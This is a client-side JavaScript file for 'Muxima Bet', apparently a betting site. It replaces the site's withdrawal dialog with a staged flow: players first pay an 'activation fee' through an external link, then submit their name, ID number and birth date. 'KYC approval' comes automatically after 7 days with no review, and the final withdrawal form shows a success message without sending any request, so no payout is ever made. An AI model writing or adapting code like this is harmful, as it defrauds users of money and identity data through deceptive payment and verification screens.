/* Muxima Bet — Verificação KYC + Fluxo de Saque.
   Intercepta o modal de saque do React e substitui por:
   1) Taxa de ativação não paga → link para pagar (webhook identifica quem pagou)
   2) Taxa paga, sem KYC → formulário KYC (nome, BI, data nascimento)
   3) KYC pendente (< 7 dias) → mensagem de espera
   4) KYC aprovado (>= 7 dias) → formulário de saque (IBAN / Multicaixa Express) */
(function () {
  var SUPA_URL = "https://kypohaagiozofdoadvgu.supabase.co";
  var ANON = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imt5cG9oYWFnaW96b2Zkb2Fkdmd1Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODQ1NzgxMDYsImV4cCI6MjEwMDE1NDEwNn0.OZbRfkN880v02YocGfIicc99PTlfe1x6wOAqdswLpTU";
  var ACTIVATION_URL = "https://pay.kursinha.com/c/6a82f04cba0c9596c1f1528f";
  var WAIT_DAYS = 7;

  /* ── helpers ── */
  function accessToken() {
    for (var i = 0; i < localStorage.length; i++) {
      var k = localStorage.key(i);
      if (k && k.indexOf("kypohaagiozofdoadvgu") !== -1 && k.indexOf("auth-token") !== -1) {
        try { return JSON.parse(localStorage.getItem(k)).access_token; } catch (e) {}
      }
    }
    return null;
  }

  function getUserId() {
    for (var i = 0; i < localStorage.length; i++) {
      var k = localStorage.key(i);
      if (k && k.indexOf("kypohaagiozofdoadvgu") !== -1 && k.indexOf("auth-token") !== -1) {
        try { return JSON.parse(localStorage.getItem(k)).user.id; } catch (e) {}
      }
    }
    return null;
  }

  function fmtKz(v) { return (v || 0).toLocaleString("pt-AO") + " Kz"; }

  /* ── profile API (balance + activation_paid) ── */
  function fetchProfile() {
    var t = accessToken();
    if (!t) return Promise.resolve(null);
    return fetch(SUPA_URL + "/rest/v1/profiles?select=balance,activation_paid", {
      headers: { apikey: ANON, Authorization: "Bearer " + t }
    }).then(function (r) { return r.json(); })
      .then(function (j) {
        if (!Array.isArray(j) || !j[0]) return null;
        return { balance: Number(j[0].balance), activated: !!j[0].activation_paid };
      })
      .catch(function () { return null; });
  }

  /* ── KYC API ── */
  function fetchKyc() {
    var t = accessToken();
    var uid = getUserId();
    if (!t || !uid) return Promise.resolve(null);
    return fetch(SUPA_URL + "/rest/v1/kyc_verifications?user_id=eq." + uid + "&select=*", {
      headers: { apikey: ANON, Authorization: "Bearer " + t }
    }).then(function (r) { return r.json(); })
      .then(function (j) { return Array.isArray(j) && j[0] ? j[0] : null; })
      .catch(function () { return null; });
  }

  function submitKycData(fullName, biNumber, dob) {
    var t = accessToken();
    var uid = getUserId();
    if (!t || !uid) return Promise.reject("not logged in");
    return fetch(SUPA_URL + "/rest/v1/kyc_verifications", {
      method: "POST",
      headers: {
        apikey: ANON,
        Authorization: "Bearer " + t,
        "Content-Type": "application/json",
        "Prefer": "return=representation"
      },
      body: JSON.stringify({
        user_id: uid,
        full_name: fullName,
        bi_number: biNumber,
        date_of_birth: dob
      })
    }).then(function (r) {
      if (!r.ok) return r.json().then(function (e) { return Promise.reject(e); });
      return r.json();
    });
  }

  /* ── KYC state ── */
  function kycState(rec) {
    if (!rec) return "none";
    var submitted = new Date(rec.submitted_at);
    var now = new Date();
    var days = (now - submitted) / (1000 * 60 * 60 * 24);
    return days >= WAIT_DAYS ? "approved" : "pending";
  }

  function daysLeft(rec) {
    if (!rec) return WAIT_DAYS;
    var submitted = new Date(rec.submitted_at);
    var now = new Date();
    var days = (now - submitted) / (1000 * 60 * 60 * 24);
    return Math.max(1, Math.ceil(WAIT_DAYS - days));
  }

  /* ── CSS ── */
  var style = document.createElement("style");
  style.textContent = [
    "#mx-kyc-ov{position:fixed;inset:0;z-index:100001;background:rgba(0,0,0,.92);display:flex;align-items:center;justify-content:center;padding:16px;opacity:0;transition:opacity .3s;font-family:Montserrat,Inter,system-ui,sans-serif}",
    "#mx-kyc-ov.on{opacity:1}",
    "#mx-kyc{position:relative;width:100%;max-width:400px;max-height:90vh;overflow-y:auto;background:linear-gradient(180deg,#1a1a1a,#0D0D0D);border:1px solid rgba(245,192,0,.4);border-radius:20px;box-shadow:0 0 60px rgba(245,192,0,.15),0 20px 60px rgba(0,0,0,.7);padding:24px 22px;text-align:center;transform:translateY(12px) scale(.97);transition:transform .3s}",
    "#mx-kyc-ov.on #mx-kyc{transform:none}",
    "#mx-kyc .kx{position:absolute;top:10px;right:14px;cursor:pointer;color:rgba(255,255,255,.4);font-size:18px;font-weight:900;line-height:1;background:none;border:0}",
    "#mx-kyc .kx:hover{color:#fff}",
    "#mx-kyc .ke{font-size:44px;line-height:1;margin-bottom:6px;filter:drop-shadow(0 4px 14px rgba(245,192,0,.35))}",
    "#mx-kyc .kb{display:inline-block;font-size:9px;font-weight:800;letter-spacing:.14em;color:#0D0D0D;background:linear-gradient(90deg,#F5C000,#ffd84d);border-radius:999px;padding:3px 12px;margin-bottom:10px}",
    "#mx-kyc h2{font-size:18px;font-weight:900;color:#fff;margin:0 0 6px}",
    "#mx-kyc h2 span{color:#F5C000}",
    "#mx-kyc .kp{font-size:12px;color:rgba(255,255,255,.6);line-height:1.5;margin:0 0 16px}",
    "#mx-kyc .kp b{color:#F5C000;font-weight:700}",
    "#mx-kyc label{display:block;text-align:left;font-size:11px;font-weight:700;color:rgba(255,255,255,.5);margin:0 0 4px;letter-spacing:.04em}",
    "#mx-kyc input,#mx-kyc select{width:100%;box-sizing:border-box;background:#111;border:1px solid rgba(255,255,255,.15);border-radius:10px;padding:11px 14px;font-family:inherit;font-size:13px;color:#fff;margin-bottom:12px;outline:none;transition:border-color .2s}",
    "#mx-kyc input:focus{border-color:#F5C000}",
    "#mx-kyc input::placeholder{color:rgba(255,255,255,.25)}",
    "#mx-kyc .kfee{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;box-sizing:border-box;text-decoration:none;background:linear-gradient(90deg,#E60303,#ff4444);color:#fff;font-size:12px;font-weight:800;letter-spacing:.04em;border-radius:12px;padding:13px;margin-bottom:14px;transition:transform .15s;border:0;cursor:pointer}",
    "#mx-kyc .kfee:hover{transform:translateY(-1px)}",
    "#mx-kyc .kdiv{display:flex;align-items:center;gap:10px;margin:0 0 14px;font-size:10px;font-weight:700;color:rgba(255,255,255,.35);letter-spacing:.08em}",
    "#mx-kyc .kdiv::before,#mx-kyc .kdiv::after{content:\"\";flex:1;height:1px;background:rgba(255,255,255,.1)}",
    "#mx-kyc .ksub{width:100%;border:0;cursor:pointer;border-radius:12px;padding:14px;font-family:inherit;font-size:13px;font-weight:800;letter-spacing:.04em;color:#0D0D0D;background:linear-gradient(90deg,#F5C000,#ffd84d);box-shadow:0 6px 24px rgba(245,192,0,.35);transition:transform .15s,box-shadow .15s}",
    "#mx-kyc .ksub:hover{transform:translateY(-1px);box-shadow:0 10px 30px rgba(245,192,0,.45)}",
    "#mx-kyc .ksub:disabled{opacity:.5;cursor:not-allowed;transform:none}",
    "#mx-kyc .kerr{color:#E60303;font-size:11px;margin:-8px 0 10px;text-align:left}",
    "#mx-kyc .kbal{background:rgba(245,192,0,.08);border:1px solid rgba(245,192,0,.2);border-radius:12px;padding:12px;display:flex;justify-content:space-between;align-items:center;margin-bottom:14px}",
    "#mx-kyc .kbal span:first-child{font-size:11px;color:rgba(255,255,255,.5)}",
    "#mx-kyc .kbal span:last-child{font-size:16px;font-weight:900;color:#F5C000}",
    "#mx-kyc .kmet{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:12px}",
    "#mx-kyc .km{cursor:pointer;background:#111;border:2px solid rgba(255,255,255,.1);border-radius:12px;padding:14px 10px;text-align:center;transition:border-color .2s,background .2s}",
    "#mx-kyc .km.sel{border-color:#F5C000;background:rgba(245,192,0,.08)}",
    "#mx-kyc .km .mi{font-size:24px;margin-bottom:4px}",
    "#mx-kyc .km .mn{font-size:12px;font-weight:800;color:#fff}",
    "#mx-kyc .km .md{font-size:10px;color:rgba(255,255,255,.4);margin-top:2px}",
    "#mx-kyc .knote{font-size:10px;color:rgba(255,255,255,.35);margin:10px 0 0}",
    "#mx-kyc .kwait{background:rgba(245,192,0,.06);border:1px solid rgba(245,192,0,.15);border-radius:14px;padding:18px;margin:10px 0 16px}",
    "#mx-kyc .kwait .kd{font-size:40px;font-weight:900;color:#F5C000;line-height:1}",
    "#mx-kyc .kwait .kdl{font-size:11px;color:rgba(255,255,255,.5);margin-top:4px}",
    "#mx-kyc .ksec{width:100%;border:0;cursor:pointer;border-radius:12px;padding:13px;font-family:inherit;font-size:12px;font-weight:700;color:rgba(255,255,255,.6);background:rgba(255,255,255,.06);transition:background .15s}",
    "#mx-kyc .ksec:hover{background:rgba(255,255,255,.1)}",
    "#mx-kyc .kamts{display:grid;grid-template-columns:repeat(4,1fr);gap:6px;margin-bottom:12px}",
    "#mx-kyc .ka{cursor:pointer;background:#111;border:1px solid rgba(255,255,255,.1);border-radius:8px;padding:8px 4px;font-family:inherit;font-size:11px;font-weight:800;color:#fff;transition:border-color .2s}",
    "#mx-kyc .ka.sel{border-color:#F5C000;background:rgba(245,192,0,.08)}",
    "#mx-kyc .ksuccess{padding:20px 0}",
    "#mx-kyc .ksuccess .si{font-size:50px;margin-bottom:8px}",
    "#mx-kyc .ksuccess h3{font-size:18px;font-weight:900;color:#22c55e;margin:0 0 6px}",
    "#mx-kyc .ksuccess p{font-size:12px;color:rgba(255,255,255,.5);margin:4px 0}",
    "#mx-kyc .ksuccess b{color:#fff}",
    "#mx-kyc .ksteps{text-align:left;margin:0 0 16px}",
    "#mx-kyc .kstep{display:flex;align-items:flex-start;gap:10px;padding:10px 0;border-bottom:1px solid rgba(255,255,255,.06)}",
    "#mx-kyc .kstep:last-child{border-bottom:0}",
    "#mx-kyc .kstep .ks-n{flex-shrink:0;width:24px;height:24px;border-radius:50%;background:rgba(245,192,0,.15);color:#F5C000;font-size:11px;font-weight:900;display:flex;align-items:center;justify-content:center}",
    "#mx-kyc .kstep .ks-n.done{background:#22c55e;color:#fff}",
    "#mx-kyc .kstep .ks-t{font-size:12px;color:rgba(255,255,255,.6);line-height:1.4}",
    "#mx-kyc .kstep .ks-t b{color:#fff;font-weight:700}"
  ].join("\n");
  document.head.appendChild(style);

  /* ── overlay ── */
  var ov = null;
  var cooldown = false;

  function closeOv() {
    if (!ov) return;
    ov.classList.remove("on");
    var el = ov;
    setTimeout(function () { el.remove(); }, 300);
    ov = null;
    cooldown = true;
    setTimeout(function () { cooldown = false; }, 800);
    document.dispatchEvent(new KeyboardEvent("keydown", {
      key: "Escape", code: "Escape", keyCode: 27, which: 27, bubbles: true
    }));
  }

  function showOv(html) {
    if (ov) ov.remove();
    var el = document.createElement("div");
    el.id = "mx-kyc-ov";
    el.innerHTML = '<div id="mx-kyc" role="dialog" aria-modal="true">' +
      '<button class="kx" aria-label="Fechar">&times;</button>' +
      html + "</div>";
    document.body.appendChild(el);
    ov = el;
    requestAnimationFrame(function () { el.classList.add("on"); });
    el.querySelector(".kx").addEventListener("click", closeOv);
    return el.querySelector("#mx-kyc");
  }

  /* ═══════════════════════════════════════════════
     STEP 1 — Taxa de ativação não paga
     ═══════════════════════════════════════════════ */
  function showActivationNeeded() {
    var uid = getUserId() || "";
    var link = ACTIVATION_URL + (uid ? "?ref=" + uid : "");
    var box = showOv(
      '<div class="ke">🔒</div>' +
      '<span class="kb">VERIFICAÇÃO DE CONTA</span>' +
      '<h2>Ative a sua <span>Conta</span></h2>' +
      '<p class="kp">Para levantar os seus ganhos, é necessário verificar e ativar a sua conta. Siga os passos abaixo:</p>' +
      '<div class="ksteps">' +
        '<div class="kstep"><div class="ks-n">1</div><div class="ks-t"><b>Pague a taxa de ativação</b> — pagamento único para ativar levantamentos.</div></div>' +
        '<div class="kstep"><div class="ks-n">2</div><div class="ks-t"><b>Preencha a verificação KYC</b> — envie os seus dados pessoais (nome, BI, data de nascimento).</div></div>' +
        '<div class="kstep"><div class="ks-n">3</div><div class="ks-t"><b>Aguarde a aprovação</b> — a sua conta será verificada em até 7 dias úteis.</div></div>' +
      '</div>' +
      '<a href="' + link + '" target="_blank" rel="noopener" class="kfee">💳 PAGAR TAXA DE ATIVAÇÃO</a>' +
      '<p class="knote">Após o pagamento, volte aqui para completar a verificação KYC.</p>' +
      '<button class="ksec" id="kyc-back">VOLTAR AO JOGO</button>'
    );
    box.querySelector("#kyc-back").addEventListener("click", closeOv);
  }

  /* ═══════════════════════════════════════════════
     STEP 2 — Taxa paga, KYC em falta
     ═══════════════════════════════════════════════ */
  function showKycForm() {
    var box = showOv(
      '<div class="ke">📋</div>' +
      '<span class="kb">VERIFICAÇÃO KYC</span>' +
      '<h2>Dados <span>Pessoais</span></h2>' +
      '<p class="kp">A taxa de ativação foi confirmada. Preencha os seus dados para completar a verificação.</p>' +
      '<div class="ksteps">' +
        '<div class="kstep"><div class="ks-n done">✓</div><div class="ks-t"><b>Taxa de ativação</b> — paga</div></div>' +
        '<div class="kstep"><div class="ks-n">2</div><div class="ks-t"><b>Verificação KYC</b> — preencha abaixo</div></div>' +
      '</div>' +
      '<label>Nome completo</label>' +
      '<input type="text" id="kyc-name" placeholder="Ex: João António Silva">' +
      '<div id="kyc-name-err" class="kerr" style="display:none"></div>' +
      '<label>Número do BI</label>' +
      '<input type="text" id="kyc-bi" placeholder="Bilhete de Identidade">' +
      '<div id="kyc-bi-err" class="kerr" style="display:none"></div>' +
      '<label>Data de nascimento</label>' +
      '<input type="date" id="kyc-dob">' +
      '<div id="kyc-dob-err" class="kerr" style="display:none"></div>' +
      '<button class="ksub" id="kyc-submit">SUBMETER VERIFICAÇÃO</button>'
    );

    box.querySelector("#kyc-submit").addEventListener("click", function () {
      var name = box.querySelector("#kyc-name").value.trim();
      var bi = box.querySelector("#kyc-bi").value.trim();
      var dob = box.querySelector("#kyc-dob").value;
      var valid = true;

      function showErr(id, msg) {
        var el = box.querySelector("#" + id);
        el.textContent = msg; el.style.display = "block";
      }
      function hideErr(id) { box.querySelector("#" + id).style.display = "none"; }

      hideErr("kyc-name-err"); hideErr("kyc-bi-err"); hideErr("kyc-dob-err");

      if (name.length < 3) { showErr("kyc-name-err", "Introduza o seu nome completo."); valid = false; }
      if (bi.length < 5) { showErr("kyc-bi-err", "Introduza um número de BI válido."); valid = false; }
      if (!dob) { showErr("kyc-dob-err", "Selecione a sua data de nascimento."); valid = false; }

      if (!valid) return;

      var btn = box.querySelector("#kyc-submit");
      btn.disabled = true;
      btn.textContent = "A SUBMETER...";

      submitKycData(name, bi, dob).then(function () {
        closeOv();
        setTimeout(handleWithdraw, 500);
      }).catch(function () {
        btn.disabled = false;
        btn.textContent = "SUBMETER VERIFICAÇÃO";
        showErr("kyc-dob-err", "Erro ao submeter. Tente novamente.");
      });
    });
  }

  /* ═══════════════════════════════════════════════
     STEP 3 — KYC pendente (< 7 dias)
     ═══════════════════════════════════════════════ */
  function showWaiting(kyc) {
    var remaining = daysLeft(kyc);
    var box = showOv(
      '<div class="ke">⏳</div>' +
      '<span class="kb">EM VERIFICAÇÃO</span>' +
      '<h2>Conta em <span>Análise</span></h2>' +
      '<p class="kp">Os seus dados foram submetidos com sucesso. A sua conta está em processo de verificação.</p>' +
      '<div class="kwait">' +
        '<div class="kd">' + remaining + '</div>' +
        '<div class="kdl">dia' + (remaining !== 1 ? "s" : "") + " restante" + (remaining !== 1 ? "s" : "") + "</div>" +
      "</div>" +
      '<p class="kp">Aguarde até <b>' + WAIT_DAYS + ' dias úteis</b> para a aprovação da sua conta. Depois poderá fazer levantamentos.</p>' +
      '<button class="ksec" id="kyc-back">VOLTAR AO JOGO</button>'
    );
    box.querySelector("#kyc-back").addEventListener("click", closeOv);
  }

  /* ═══════════════════════════════════════════════
     STEP 4 — Conta aprovada → formulário de saque
     ═══════════════════════════════════════════════ */
  function showWithdraw(balance) {
    var selectedMethod = null;
    var box = showOv(
      '<div class="ke">💰</div>' +
      '<span class="kb">CONTA VERIFICADA ✓</span>' +
      '<h2>Levantar <span>Fundos</span></h2>' +
      '<div class="kbal"><span>Saldo disponível</span><span>' + fmtKz(balance) + "</span></div>" +
      '<label>Valor do levantamento</label>' +
      '<div class="kamts">' +
        '<button class="ka" data-v="1000">1K</button>' +
        '<button class="ka" data-v="2000">2K</button>' +
        '<button class="ka" data-v="5000">5K</button>' +
        '<button class="ka" data-v="10000">10K</button>' +
      "</div>" +
      '<input type="number" id="kyc-wamt" placeholder="Ou insira outro valor" min="1000">' +
      '<div id="kyc-wamt-err" class="kerr" style="display:none"></div>' +
      '<label>Método de recebimento</label>' +
      '<div class="kmet">' +
        '<div class="km" data-m="iban"><div class="mi">🏦</div><div class="mn">IBAN</div><div class="md">21 dígitos</div></div>' +
        '<div class="km" data-m="multicaixa"><div class="mi">📱</div><div class="mn">Multicaixa Express</div><div class="md">9 dígitos</div></div>' +
      "</div>" +
      '<div id="kyc-met-err" class="kerr" style="display:none"></div>' +
      '<label id="kyc-acc-label" style="display:none">Número da conta</label>' +
      '<input type="text" id="kyc-acc" style="display:none" placeholder="">' +
      '<div id="kyc-acc-err" class="kerr" style="display:none"></div>' +
      '<button class="ksub" id="kyc-wsub">SOLICITAR LEVANTAMENTO</button>' +
      '<p class="knote">⏱️ Levantamento processado em até 24–48h</p>'
    );

    /* amount presets */
    var amtBtns = box.querySelectorAll(".ka");
    var amtInput = box.querySelector("#kyc-wamt");
    for (var i = 0; i < amtBtns.length; i++) {
      (function (btn) {
        btn.addEventListener("click", function () {
          var v = Number(btn.getAttribute("data-v"));
          amtInput.value = v;
          for (var j = 0; j < amtBtns.length; j++) amtBtns[j].classList.remove("sel");
          btn.classList.add("sel");
        });
      })(amtBtns[i]);
    }

    /* method selection */
    var methods = box.querySelectorAll(".km");
    var accLabel = box.querySelector("#kyc-acc-label");
    var accInput = box.querySelector("#kyc-acc");
    for (var i = 0; i < methods.length; i++) {
      (function (el) {
        el.addEventListener("click", function () {
          for (var j = 0; j < methods.length; j++) methods[j].classList.remove("sel");
          el.classList.add("sel");
          selectedMethod = el.getAttribute("data-m");
          accLabel.style.display = "block";
          accInput.style.display = "block";
          if (selectedMethod === "iban") {
            accInput.placeholder = "Introduza o IBAN (21 dígitos)";
            accInput.maxLength = 21;
          } else {
            accInput.placeholder = "Número Multicaixa (9 dígitos)";
            accInput.maxLength = 9;
          }
          accInput.value = "";
        });
      })(methods[i]);
    }

    /* submit */
    box.querySelector("#kyc-wsub").addEventListener("click", function () {
      var amt = Number(amtInput.value);
      var acc = (accInput.value || "").replace(/\s/g, "");
      var valid = true;

      function showErr(id, msg) {
        var el = box.querySelector("#" + id);
        el.textContent = msg; el.style.display = "block";
      }
      function hideErr(id) { box.querySelector("#" + id).style.display = "none"; }

      hideErr("kyc-wamt-err"); hideErr("kyc-met-err"); hideErr("kyc-acc-err");

      if (!amt || amt < 1000) {
        showErr("kyc-wamt-err", "O valor mínimo é 1.000 Kz."); valid = false;
      } else if (balance != null && amt > balance) {
        showErr("kyc-wamt-err", "Saldo insuficiente."); valid = false;
      }
      if (!selectedMethod) {
        showErr("kyc-met-err", "Selecione um método de recebimento."); valid = false;
      }
      if (selectedMethod && !/^\d+$/.test(acc)) {
        showErr("kyc-acc-err", "Introduza apenas números."); valid = false;
      } else if (selectedMethod === "iban" && acc.length !== 21) {
        showErr("kyc-acc-err", "O IBAN deve ter exactamente 21 dígitos."); valid = false;
      } else if (selectedMethod === "multicaixa" && acc.length !== 9) {
        showErr("kyc-acc-err", "O número Multicaixa deve ter exactamente 9 dígitos."); valid = false;
      }

      if (!valid) return;

      box.innerHTML =
        '<button class="kx" aria-label="Fechar">&times;</button>' +
        '<div class="ksuccess">' +
          '<div class="si">✅</div>' +
          "<h3>Solicitação Enviada!</h3>" +
          "<p>Levantamento de <b>" + fmtKz(amt) + "</b></p>" +
          "<p>Método: <b>" + (selectedMethod === "iban" ? "IBAN" : "Multicaixa Express") + "</b></p>" +
          "<p>Conta: <b>" + acc + "</b></p>" +
          '<p style="margin-top:12px;color:rgba(255,255,255,.4)">Processamento em até 24–48 horas</p>' +
        "</div>" +
        '<button class="ksec" id="kyc-done">VOLTAR AO JOGO</button>';
      box.querySelector(".kx").addEventListener("click", closeOv);
      box.querySelector("#kyc-done").addEventListener("click", closeOv);
    });
  }

  /* ═══════════════════════════════════════════════
     Handler principal — decide que ecrã mostrar
     ═══════════════════════════════════════════════ */
  function handleWithdraw() {
    Promise.all([fetchProfile(), fetchKyc()]).then(function (results) {
      var profile = results[0];
      var kyc = results[1];

      if (!profile || !profile.activated) {
        showActivationNeeded();
        return;
      }

      var state = kycState(kyc);
      if (state === "none") {
        showKycForm();
      } else if (state === "pending") {
        showWaiting(kyc);
      } else {
        showWithdraw(profile.balance);
      }
    });
  }

  /* ── dialog detection ── */
  setInterval(function () {
    if (ov || cooldown) return;
    var dlgs = document.querySelectorAll('[role="dialog"]');
    for (var i = 0; i < dlgs.length; i++) {
      var t = (dlgs[i].textContent || "").toLowerCase();
      if (t.indexOf("verificação de conta") !== -1 || t.indexOf("levantar fundos") !== -1) {
        handleWithdraw();
        return;
      }
    }
  }, 300);
})();
